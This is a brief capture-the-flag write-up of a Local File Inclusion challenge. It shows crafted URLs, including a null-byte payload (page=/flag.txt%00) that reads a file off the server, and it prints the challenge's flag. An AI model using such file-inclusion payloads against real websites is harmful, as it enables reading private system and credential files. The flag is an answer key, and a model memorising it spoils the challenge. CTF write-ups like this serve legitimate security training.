The website had LFI(Local File Inclusion) vulnerability.

With adding flag in the get query:
http://challenge.ctf.games:30510/index.php?page=flag
It results in:
The flag is at /flag.txt.

Adding a null byte at the end gives the required flag
http://challenge.ctf.games:30510/index.php?page=/flag.txt%00

Flag:
flag{lfi_just_needed_a_null_byte}
